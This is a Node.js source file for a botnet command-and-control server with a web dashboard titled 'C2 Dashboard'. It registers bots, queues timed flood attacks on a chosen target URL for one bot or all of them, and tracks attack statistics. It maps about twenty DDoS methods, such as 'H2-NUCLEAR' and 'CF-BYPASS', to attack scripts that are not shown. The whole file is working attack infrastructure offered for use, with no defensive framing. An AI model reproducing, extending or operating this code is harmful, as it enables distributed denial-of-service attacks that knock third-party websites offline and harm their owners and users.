const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const rateLimit = require('express-rate-limit');

const app = express();
app.use(express.json());

const port = process.env.PORT || 5553;
const AUTH_TOKEN = "ricardo";

app.set('trust proxy', 1);

// Rate limiting (skip UI and ping)
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 1000,
  skip: (req) => req.path === '/' || req.path === '/ping' || req.path === '/dashboard',
  keyGenerator: (req) => req.ip || req.connection.remoteAddress || 'unknown'
});
app.use('/api/', limiter);

// Auth middleware
const authenticate = (req, res, next) => {
  const token = req.headers['authorization'] || req.query.token;
  if (token !== AUTH_TOKEN) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
};

// ========== DATA STORES ==========
let connectedBots = [];
let pendingCommands = {};
let stopCommands = new Set();
let blockedBots = new Set();
let attackHistory = [];

let serverStats = {
  totalAttacks: 0,
  activeAttacks: 0,
  totalBots: 0,
  totalRequests: 0,
  attacksByMethod: {},
  attacksByTarget: {},
  startTime: Date.now(),
  uptime: 0
};

const BOT_TIMEOUT = 30000;

// ========== CLEANUP ==========
function cleanupInactiveBots() {
  const now = Date.now();
  const before = connectedBots.length;
  connectedBots = connectedBots.filter(bot => now - bot.lastSeen < BOT_TIMEOUT);
  if (before !== connectedBots.length) {
    serverStats.totalBots = connectedBots.length;
    console.log(`[CLEANUP] Removed ${before - connectedBots.length} inactive bots`);
  }
}

function updateAttackingStatus() {
  const now = Date.now();
  for (const bot of connectedBots) {
    if (bot.attacking && bot.attackEndTime && now >= bot.attackEndTime) {
      bot.attacking = false;
      bot.attackEndTime = 0;
      serverStats.activeAttacks = Math.max(0, serverStats.activeAttacks - 1);
    }
  }
}

setInterval(() => {
  cleanupInactiveBots();
  updateAttackingStatus();
  serverStats.uptime = Math.floor((Date.now() - serverStats.startTime) / 1000);
}, 5000);

// ========== METHOD FILES MAPPING (UPDATED) ==========
const methodFiles = {
  // NEW H2-NUCLEAR METHODS
  'H2-NUCLEAR': 'methods/h2-nuclear.js',
  'H2N': 'methods/h2-nuclear.js',
  'H2N-MAX': 'methods/h2-nuclear.js',
  
  // Existing methods
  'RAW-GET': 'methods/raw-get.js',
  'CF-BYPASS': 'methods/cf-bypass.js',
  'MODERN-FLOOD': 'methods/modern-flood.js',
  'HTTP-SICARIO': 'methods/REX-COSTUM.js',
  'RAW-HTTP': 'methods/h2-nust.js',
  'R9': 'methods/high-dstat.js',
  'PRIV-TOR': 'methods/w-flood1.js',
  'HOLD-PANEL': 'methods/http-panel.js',
  'R1': 'methods/vhold.js',
  'UAM': 'methods/uam.js',
  'W.I.L': 'methods/wil.js',
  'BYPASS': 'methods/BYPASS.js',
  'VHOLD': 'methods/vhold.js',
  'W-FLOOD': 'methods/w-flood1.js',
  'STRESS': 'methods/curl-stress.js',
  'CURL-SPAM': 'methods/curl-stress.js',
  'RAPID10': 'methods/r10-rapid.js',
  'R10': 'methods/r10-rapid.js'
};

// ========== BOT ENDPOINTS ==========
app.post('/register', (req, res) => {
  const { id, name, url } = req.body;
  if (!id) return res.status(400).json({ error: 'Bot ID required' });

  if (blockedBots.has(id)) {
    console.log(`[BLOCKED] Bot tried to register: ${id}`);
    return res.status(403).json({ error: 'Bot is blocked', approved: false });
  }

  let bot = connectedBots.find(b => b.id === id);
  if (bot) {
    bot.lastSeen = Date.now();
    bot.url = url || bot.url;
    bot.name = name || bot.name;
    return res.json({ message: 'Bot already registered', approved: true, bot });
  }

  const newBot = {
    id,
    name: name || `Bot-${id.slice(-6)}`,
    url: url || `http://localhost:${Math.floor(Math.random() * 10000) + 1000}`,
    registeredAt: new Date().toISOString(),
    lastSeen: Date.now(),
    attacking: false,
    attackEndTime: 0,
    attacksPerformed: 0
  };
  connectedBots.push(newBot);
  serverStats.totalBots = connectedBots.length;
  console.log(`[REGISTER] New bot: ${newBot.name} (${id})`);
  res.json({ message: 'Bot registered successfully', approved: true, bot: newBot });
});

app.post('/heartbeat', (req, res) => {
  const { id } = req.body;
  if (!id) return res.status(400).json({ error: 'Bot ID required' });

  const bot = connectedBots.find(b => b.id === id);
  if (bot) {
    bot.lastSeen = Date.now();
    return res.json({ status: 'ok' });
  }

  if (!blockedBots.has(id)) {
    const newBot = {
      id,
      name: `Bot-${id.slice(-6)}`,
      url: 'unknown',
      registeredAt: new Date().toISOString(),
      lastSeen: Date.now(),
      attacking: false,
      attackEndTime: 0,
      attacksPerformed: 0
    };
    connectedBots.push(newBot);
    serverStats.totalBots = connectedBots.length;
    console.log(`[HEARTBEAT] Auto-registered bot: ${id}`);
    return res.json({ status: 'registered' });
  }
  res.status(403).json({ error: 'Bot is blocked' });
});

app.get('/get-command', (req, res) => {
  const { botId } = req.query;
  if (!botId) return res.status(400).json({ error: 'Bot ID required' });

  const bot = connectedBots.find(b => b.id === botId);
  if (bot) bot.lastSeen = Date.now();

  if (stopCommands.has(botId)) {
    stopCommands.delete(botId);
    return res.json({ hasCommand: true, command: { action: 'stop' } });
  }

  if (pendingCommands[botId]) {
    const command = pendingCommands[botId];
    delete pendingCommands[botId];
    console.log(`[COMMAND] Sending attack to ${botId}: ${command.methods} -> ${command.target}`);
    return res.json({ hasCommand: true, command: { action: 'attack', ...command } });
  }

  res.json({ hasCommand: false });
});

app.post('/api/report', authenticate, (req, res) => {
  const { botId, target, method, requests, duration } = req.body;
  serverStats.totalRequests += requests || 0;
  serverStats.attacksByMethod[method] = (serverStats.attacksByMethod[method] || 0) + 1;
  serverStats.attacksByTarget[target] = (serverStats.attacksByTarget[target] || 0) + 1;

  const bot = connectedBots.find(b => b.id === botId);
  if (bot) {
    bot.attacksPerformed = (bot.attacksPerformed || 0) + 1;
    bot.lastReport = Date.now();
  }
  console.log(`[REPORT] ${botId} sent ${requests || 0} requests to ${target} using ${method}`);
  res.json({ success: true });
});

// ========== API ENDPOINTS (for UI) ==========
app.get('/bots', authenticate, (req, res) => {
  const now = Date.now();
  const botsWithStatus = connectedBots.map(bot => ({
    id: bot.id,
    name: bot.name,
    url: bot.url,
    lastSeen: bot.lastSeen,
    attacking: bot.attacking || false,
    online: (now - bot.lastSeen) < BOT_TIMEOUT,
    attacksPerformed: bot.attacksPerformed || 0
  }));
  res.json({ total: connectedBots.length, bots: botsWithStatus });
});

app.get('/api/stats', authenticate, (req, res) => {
  const now = Date.now();
  const onlineBots = connectedBots.filter(b => now - b.lastSeen < BOT_TIMEOUT).length;
  res.json({
    totalAttacks: serverStats.totalAttacks,
    activeAttacks: serverStats.activeAttacks,
    totalRequests: serverStats.totalRequests,
    uptime: serverStats.uptime,
    totalBots: connectedBots.length,
    onlineBots: onlineBots,
    offlineBots: connectedBots.length - onlineBots,
    attacksByMethod: serverStats.attacksByMethod,
    attacksByTarget: serverStats.attacksByTarget
  });
});

app.get('/attack-bot', authenticate, (req, res) => {
  const { bot, target, time, methods } = req.query;
  if (!bot || !target || !time || !methods) {
    return res.json({ success: false, error: 'Missing parameters' });
  }
  const duration = parseInt(time);
  if (isNaN(duration) || duration < 1 || duration > 3600) {
    return res.json({ success: false, error: 'Invalid time (1-3600 seconds)' });
  }
  const botObj = connectedBots.find(b => b.id === bot);
  if (!botObj) {
    return res.json({ success: false, error: 'Bot not found' });
  }
  botObj.attacking = true;
  botObj.attackEndTime = Date.now() + duration * 1000;
  pendingCommands[botObj.id] = {
    target: target,
    time: duration,
    methods: methods,
    timestamp: Date.now()
  };
  serverStats.totalAttacks++;
  serverStats.activeAttacks++;
  serverStats.attacksByMethod[methods] = (serverStats.attacksByMethod[methods] || 0) + 1;
  serverStats.attacksByTarget[target] = (serverStats.attacksByTarget[target] || 0) + 1;
  console.log(`[ATTACK-BOT] ${methods} -> ${target} on ${botObj.name} (${botObj.id}) for ${duration}s`);
  res.json({ success: true, message: 'Command sent to bot' });
});

app.get('/attack-all', authenticate, (req, res) => {
  const { target, time, methods } = req.query;
  if (!target || !time || !methods) {
    return res.status(400).json({ success: false, error: 'Missing parameters: target, time, methods' });
  }
  const duration = parseInt(time);
  if (isNaN(duration) || duration < 1 || duration > 3600) {
    return res.status(400).json({ success: false, error: 'Invalid time (1-3600 seconds)' });
  }

  const now = Date.now();
  const onlineBots = connectedBots.filter(b => (now - b.lastSeen) < BOT_TIMEOUT);
  if (onlineBots.length === 0) {
    return res.status(404).json({ success: false, error: 'No online bots available' });
  }

  let sentCount = 0;
  const failedBots = [];
  for (const bot of onlineBots) {
    try {
      bot.attacking = true;
      bot.attackEndTime = Date.now() + duration * 1000;
      pendingCommands[bot.id] = {
        target: target,
        time: duration,
        methods: methods,
        timestamp: Date.now()
      };
      sentCount++;
    } catch (error) {
      failedBots.push(bot.id);
    }
  }
  serverStats.totalAttacks += sentCount;
  serverStats.activeAttacks += sentCount;
  serverStats.attacksByMethod[methods] = (serverStats.attacksByMethod[methods] || 0) + sentCount;
  serverStats.attacksByTarget[target] = (serverStats.attacksByTarget[target] || 0) + sentCount;

  console.log(`[ATTACK-ALL] ${methods} -> ${target} on ${sentCount}/${onlineBots.length} bots for ${duration}s`);
  res.json({
    success: true,
    message: `Attack sent to ${sentCount} bots`,
    sent: sentCount,
    total: onlineBots.length,
    failed: failedBots.length > 0 ? failedBots : undefined
  });
});

app.get('/stop-all', authenticate, (req, res) => {
  pendingCommands = {};
  for (const bot of connectedBots) {
    stopCommands.add(bot.id);
    bot.attacking = false;
    bot.attackEndTime = 0;
  }
  serverStats.activeAttacks = 0;
  console.log(`[STOP-ALL] Stopped all attacks on ${connectedBots.length} bots`);
  res.json({ success: true, message: `Stop command sent to ${connectedBots.length} bots` });
});

app.get('/block-bot', authenticate, (req, res) => {
  const { bot } = req.query;
  if (!bot) return res.status(400).json({ success: false, error: 'Bot ID required' });
  blockedBots.add(bot);
  connectedBots = connectedBots.filter(b => b.id !== bot);
  delete pendingCommands[bot];
  stopCommands.delete(bot);
  serverStats.totalBots = connectedBots.length;
  res.json({ success: true, message: 'Bot blocked' });
});

app.get('/unblock-bot', authenticate, (req, res) => {
  const { bot } = req.query;
  if (!bot) return res.status(400).json({ success: false, error: 'Bot ID required' });
  blockedBots.delete(bot);
  res.json({ success: true, message: 'Bot unblocked' });
});

app.get('/blocked', authenticate, (req, res) => {
  res.json({ blocked: Array.from(blockedBots) });
});

app.get('/remove-bot', authenticate, (req, res) => {
  const { bot } = req.query;
  if (!bot) return res.status(400).json({ success: false, error: 'Bot ID required' });
  const before = connectedBots.length;
  connectedBots = connectedBots.filter(b => b.id !== bot);
  delete pendingCommands[bot];
  stopCommands.delete(bot);
  serverStats.totalBots = connectedBots.length;
  res.json({ success: true, message: 'Bot removed', removed: before !== connectedBots.length });
});

app.get('/methods', authenticate, (req, res) => {
  const available = Object.keys(methodFiles).filter(name => {
    const filePath = path.join(__dirname, methodFiles[name]);
    return fs.existsSync(filePath);
  });
  res.json({ methods: available, total: available.length });
});

app.get('/ping', (req, res) => {
  res.json({
    alive: true,
    timestamp: Date.now(),
    bots: connectedBots.length,
    uptime: serverStats.uptime
  });
});

app.get('/health', (req, res) => {
  res.json({ status: 'healthy', bots: connectedBots.length, uptime: serverStats.uptime });
});

// ========== WEB UI (UPDATED WITH NEW METHODS) ==========
const HTML_UI = [
  '<!DOCTYPE html>',
  '<html lang="en">',
  '<head>',
  '  <meta charset="UTF-8">',
  '  <meta name="viewport" content="width=device-width, initial-scale=1.0">',
  '  <title>C2 Dashboard</title>',
  '  <style>',
  '    * { margin: 0; padding: 0; box-sizing: border-box; }',
  '    body {',
  '      font-family: \'Segoe UI\', Tahoma, Geneva, Verdana, sans-serif;',
  '      background: #0d1117;',
  '      color: #e6edf3;',
  '      padding: 20px;',
  '    }',
  '    .container { max-width: 1400px; margin: 0 auto; }',
  '    .header {',
  '      display: flex;',
  '      justify-content: space-between;',
  '      align-items: center;',
  '      padding: 15px 20px;',
  '      background: #161b22;',
  '      border-radius: 12px;',
  '      border: 1px solid #30363d;',
  '      margin-bottom: 20px;',
  '      flex-wrap: wrap;',
  '      gap: 10px;',
  '    }',
  '    .header h1 { font-size: 24px; color: #58a6ff; }',
  '    .status { font-size: 14px; color: #8b949e; }',
  '    .status span { color: #2ea043; font-weight: bold; }',
  '    .login-box {',
  '      display: flex;',
  '      gap: 10px;',
  '      align-items: center;',
  '    }',
  '    .login-box input {',
  '      padding: 8px 12px;',
  '      border-radius: 6px;',
  '      border: 1px solid #30363d;',
  '      background: #0d1117;',
  '      color: #e6edf3;',
  '    }',
  '    .login-box button {',
  '      padding: 8px 16px;',
  '      border-radius: 6px;',
  '      border: none;',
  '      background: #238636;',
  '      color: #fff;',
  '      cursor: pointer;',
  '      font-weight: bold;',
  '    }',
  '    .login-box button:hover { background: #2ea043; }',
  '    .grid {',
  '      display: grid;',
  '      grid-template-columns: 1fr 1fr;',
  '      gap: 20px;',
  '      margin-bottom: 20px;',
  '    }',
  '    .card {',
  '      background: #161b22;',
  '      border: 1px solid #30363d;',
  '      border-radius: 12px;',
  '      padding: 20px;',
  '    }',
  '    .card h3 {',
  '      font-size: 16px;',
  '      color: #8b949e;',
  '      margin-bottom: 12px;',
  '      border-bottom: 1px solid #30363d;',
  '      padding-bottom: 8px;',
  '    }',
  '    .stats-grid {',
  '      display: grid;',
  '      grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));',
  '      gap: 10px;',
  '    }',
  '    .stat-item {',
  '      background: #0d1117;',
  '      padding: 12px;',
  '      border-radius: 8px;',
  '      text-align: center;',
  '    }',
  '    .stat-item .value { font-size: 22px; font-weight: bold; color: #58a6ff; }',
  '    .stat-item .label { font-size: 12px; color: #8b949e; margin-top: 4px; }',
  '    .bot-list {',
  '      max-height: 400px;',
  '      overflow-y: auto;',
  '    }',
  '    .bot-item {',
  '      display: flex;',
  '      justify-content: space-between;',
  '      align-items: center;',
  '      padding: 8px 12px;',
  '      border-bottom: 1px solid #21262d;',
  '      font-size: 14px;',
  '      flex-wrap: wrap;',
  '      gap: 5px;',
  '    }',
  '    .bot-item .id { color: #58a6ff; font-family: monospace; font-size: 12px; }',
  '    .bot-item .status { font-weight: bold; }',
  '    .bot-item .status.online { color: #2ea043; }',
  '    .bot-item .status.offline { color: #f85149; }',
  '    .bot-item .attacking { color: #d29922; }',
  '    .attack-form {',
  '      display: grid;',
  '      grid-template-columns: 1fr 1fr;',
  '      gap: 10px;',
  '      margin-top: 10px;',
  '    }',
  '    .attack-form input, .attack-form select, .attack-form button {',
  '      padding: 8px 12px;',
  '      border-radius: 6px;',
  '      border: 1px solid #30363d;',
  '      background: #0d1117;',
  '      color: #e6edf3;',
  '    }',
  '    .attack-form button {',
  '      background: #238636;',
  '      border: none;',
  '      cursor: pointer;',
  '      font-weight: bold;',
  '      grid-column: span 2;',
  '    }',
  '    .attack-form button:hover { background: #2ea043; }',
  '    .attack-form button.stop { background: #da3633; }',
  '    .attack-form button.stop:hover { background: #f85149; }',
  '    .actions {',
  '      display: flex;',
  '      gap: 10px;',
  '      margin-top: 10px;',
  '      flex-wrap: wrap;',
  '    }',
  '    .actions button {',
  '      padding: 8px 16px;',
  '      border-radius: 6px;',
  '      border: none;',
  '      cursor: pointer;',
  '      font-weight: bold;',
  '      color: #fff;',
  '    }',
  '    .actions .stop-all { background: #da3633; }',
  '    .actions .stop-all:hover { background: #f85149; }',
  '    .actions .refresh { background: #1f6feb; }',
  '    .actions .refresh:hover { background: #388bfd; }',
  '    .log-area {',
  '      background: #0d1117;',
  '      border: 1px solid #30363d;',
  '      border-radius: 8px;',
  '      padding: 12px;',
  '      max-height: 200px;',
  '      overflow-y: auto;',
  '      font-family: monospace;',
  '      font-size: 13px;',
  '      margin-top: 20px;',
  '      white-space: pre-wrap;',
  '    }',
  '    @media (max-width: 768px) {',
  '      .grid { grid-template-columns: 1fr; }',
  '      .header { flex-direction: column; align-items: stretch; }',
  '      .login-box { justify-content: center; }',
  '    }',
  '  </style>',
  '</head>',
  '<body>',
  '<div class="container">',
  '  <div class="header">',
  '    <h1>🎯 C2 Dashboard</h1>',
  '    <div class="status">',
  '      <span id="serverStatus">●</span> Online &nbsp;|&nbsp; Uptime: <span id="uptime">0</span>s',
  '    </div>',
  '    <div class="login-box">',
  '      <input type="password" id="tokenInput" placeholder="Auth Token" value="ricardo">',
  '      <button onclick="login()">Login</button>',
  '    </div>',
  '  </div>',
  '',
  '  <div class="grid">',
  '    <div class="card">',
  '      <h3>📊 Statistics</h3>',
  '      <div class="stats-grid" id="statsGrid">',
  '        <div class="stat-item"><div class="value" id="statTotalBots">0</div><div class="label">Total Bots</div></div>',
  '        <div class="stat-item"><div class="value" id="statOnlineBots">0</div><div class="label">Online</div></div>',
  '        <div class="stat-item"><div class="value" id="statActiveAttacks">0</div><div class="label">Active Attacks</div></div>',
  '        <div class="stat-item"><div class="value" id="statTotalAttacks">0</div><div class="label">Total Attacks</div></div>',
  '        <div class="stat-item"><div class="value" id="statTotalRequests">0</div><div class="label">Total Requests</div></div>',
  '      </div>',
  '    </div>',
  '    <div class="card">',
  '      <h3>🎯 Quick Attack</h3>',
  '      <div class="attack-form">',
  '        <input type="text" id="attackTarget" placeholder="Target URL (e.g., https://example.com)">',
  '        <input type="number" id="attackTime" placeholder="Time (seconds)" value="60">',
  '        <select id="attackMethod">',
  '          <!-- NEW H2-NUCLEAR METHODS -->',
  '          <option value="H2-NUCLEAR">💀 H2-NUCLEAR (HTTP/2 Flood)</option>',
  '          <option value="H2N-MAX">💀💀 H2N-MAX (Max Power)</option>',
  '          <option value="RAW-GET">RAW-GET</option>',
  '          <option value="CF-BYPASS">CF-BYPASS</option>',
  '          <option value="MODERN-FLOOD">MODERN-FLOOD</option>',
  '          <option value="HTTP-SICARIO">HTTP-SICARIO</option>',
  '          <option value="RAW-HTTP">RAW-HTTP</option>',
  '          <option value="R9">R9</option>',
  '          <option value="PRIV-TOR">PRIV-TOR</option>',
  '          <option value="HOLD-PANEL">HOLD-PANEL</option>',
  '          <option value="R1">R1</option>',
  '          <option value="UAM">UAM</option>',
  '          <option value="W.I.L">W.I.L</option>',
  '          <option value="BYPASS">BYPASS</option>',
  '          <option value="VHOLD">VHOLD</option>',
  '          <option value="W-FLOOD">W-FLOOD</option>',
  '          <option value="STRESS">STRESS</option>',
  '          <option value="CURL-SPAM">CURL-SPAM</option>',
  '          <option value="RAPID10">RAPID10</option>',
  '          <option value="R10">R10</option>',
  '        </select>',
  '        <button onclick="attackAll()">🚀 Attack All Bots</button>',
  '        <button class="stop" onclick="stopAll()">⏹ Stop All</button>',
  '      </div>',
  '    </div>',
  '  </div>',
  '',
  '  <div class="card">',
  '    <h3>🤖 Bots <span id="botCount">(0)</span></h3>',
  '    <div class="actions">',
  '      <button class="refresh" onclick="refreshData()">🔄 Refresh</button>',
  '      <button class="stop-all" onclick="stopAll()">⏹ Stop All Attacks</button>',
  '    </div>',
  '    <div class="bot-list" id="botList">',
  '      <div style="color:#8b949e; text-align:center; padding:20px;">Loading bots...</div>',
  '    </div>',
  '  </div>',
  '',
  '  <div class="log-area" id="logArea">📋 Logs will appear here...</div>',
  '</div>',
  '',
  '<script>',
  '  let token = localStorage.getItem("c2_token") || "ricardo";',
  '  document.getElementById("tokenInput").value = token;',
  '',
  '  function login() {',
  '    token = document.getElementById("tokenInput").value;',
  '    localStorage.setItem("c2_token", token);',
  '    refreshData();',
  '  }',
  '',
  '  async function apiCall(endpoint, options = {}) {',
  '    const headers = { "Authorization": token, ...options.headers };',
  '    const res = await fetch(endpoint, { ...options, headers });',
  '    if (res.status === 401) {',
  '      alert("Unauthorized – please check your token.");',
  '      return null;',
  '    }',
  '    return res.json();',
  '  }',
  '',
  '  function log(msg) {',
  '    const area = document.getElementById("logArea");',
  '    const time = new Date().toLocaleTimeString();',
  '    area.textContent += "[" + time + "] " + msg + "\\n";',
  '    area.scrollTop = area.scrollHeight;',
  '  }',
  '',
  '  async function refreshData() {',
  '    try {',
  '      const botsData = await apiCall("/bots");',
  '      if (botsData) {',
  '        const bots = botsData.bots || [];',
  '        const list = document.getElementById("botList");',
  '        if (bots.length === 0) {',
  '          list.innerHTML = "<div style=\\"color:#8b949e; text-align:center; padding:20px;\\">No bots connected.</div>";',
  '        } else {',
  '          list.innerHTML = bots.map(function(b) {',
  '            return "<div class=\\"bot-item\\">" +',
  '              "<span class=\\"id\\">" + b.id + "</span>" +',
  '              "<span>" + b.name + "</span>" +',
  '              "<span class=\\"status " + (b.online ? "online" : "offline") + "\\">" + (b.online ? "● Online" : "● Offline") + "</span>" +',
  '              "<span class=\\"attacking\\">" + (b.attacking ? "🔥 Attacking" : "⏸ Idle") + "</span>" +',
  '              "<span>Attacks: " + b.attacksPerformed + "</span>" +',
  '            "</div>";',
  '          }).join("");',
  '        }',
  '        document.getElementById("botCount").textContent = "(" + bots.length + ")";',
  '      }',
  '',
  '      const stats = await apiCall("/api/stats");',
  '      if (stats) {',
  '        document.getElementById("statTotalBots").textContent = stats.totalBots || 0;',
  '        document.getElementById("statOnlineBots").textContent = stats.onlineBots || 0;',
  '        document.getElementById("statActiveAttacks").textContent = stats.activeAttacks || 0;',
  '        document.getElementById("statTotalAttacks").textContent = stats.totalAttacks || 0;',
  '        document.getElementById("statTotalRequests").textContent = stats.totalRequests || 0;',
  '        document.getElementById("uptime").textContent = stats.uptime || 0;',
  '      }',
  '    } catch (e) {',
  '      log("❌ Error refreshing: " + e.message);',
  '    }',
  '  }',
  '',
  '  async function attackAll() {',
  '    const target = document.getElementById("attackTarget").value.trim();',
  '    const time = document.getElementById("attackTime").value;',
  '    const method = document.getElementById("attackMethod").value;',
  '    if (!target) { alert("Please enter a target URL."); return; }',
  '    log("🚀 Sending attack-all: " + method + " -> " + target + " for " + time + "s");',
  '    try {',
  '      const result = await apiCall("/attack-all?target=" + encodeURIComponent(target) + "&time=" + time + "&methods=" + method);',
  '      if (result && result.success) {',
  '        log("✅ Attack sent to " + result.sent + "/" + result.total + " bots");',
  '        if (result.failed && result.failed.length) {',
  '          log("⚠️ Failed bots: " + result.failed.join(", "));',
  '        }',
  '      } else {',
  '        log("❌ Attack failed: " + (result?.error || "Unknown error"));',
  '      }',
  '    } catch (e) { log("❌ Error: " + e.message); }',
  '    refreshData();',
  '  }',
  '',
  '  async function stopAll() {',
  '    log("⏹ Stopping all attacks...");',
  '    try {',
  '      const result = await apiCall("/stop-all");',
  '      if (result && result.success) {',
  '        log("✅ All attacks stopped.");',
  '      } else {',
  '        log("❌ Failed to stop attacks.");',
  '      }',
  '    } catch (e) { log("❌ Error: " + e.message); }',
  '    refreshData();',
  '  }',
  '',
  '  setInterval(refreshData, 5000);',
  '  login();',
  '  refreshData();',
  '</script>',
  '</body>',
  '</html>'
].join('\n');

// Serve UI on root and /dashboard
app.get(['/', '/dashboard'], (req, res) => {
  console.log(`[UI] Serving dashboard to ${req.ip}`);
  res.send(HTML_UI);
});

// Catch-all: serve UI for any non-API route
app.use((req, res, next) => {
  if (req.path.startsWith('/api') || req.path.startsWith('/bots') || req.path.startsWith('/attack') || req.path.startsWith('/stop') || req.path.startsWith('/block') || req.path.startsWith('/unblock') || req.path.startsWith('/remove') || req.path.startsWith('/blocked') || req.path.startsWith('/methods') || req.path.startsWith('/ping') || req.path.startsWith('/health')) {
    return res.status(404).json({ error: 'API endpoint not found' });
  }
  res.send(HTML_UI);
});

// ========== ERROR HANDLER ==========
app.use((err, req, res, next) => {
  console.error('[ERROR]', err.message);
  res.status(500).json({ error: 'Internal server error' });
});

// ========== START ==========
app.listen(port, () => {
  console.log('\n========================================');
  console.log('🔥 C2 SERVER WITH WEB UI READY');
  console.log('========================================');
  console.log(`📍 Port: ${port}`);
  console.log(`🔑 Auth Token: ${AUTH_TOKEN}`);
  console.log(`🌐 Open in browser: http://localhost:${port}`);
  console.log('   (or your Render URL)');
  console.log('========================================\n');

  if (!fs.existsSync('./methods')) {
    fs.mkdirSync('./methods');
    console.log('[SETUP] Created methods directory');
  }
  if (!fs.existsSync('./proxy.txt')) {
    fs.writeFileSync('./proxy.txt', '# Proxies (ip:port)\n');
    console.log('[SETUP] Created proxy.txt');
  }
});
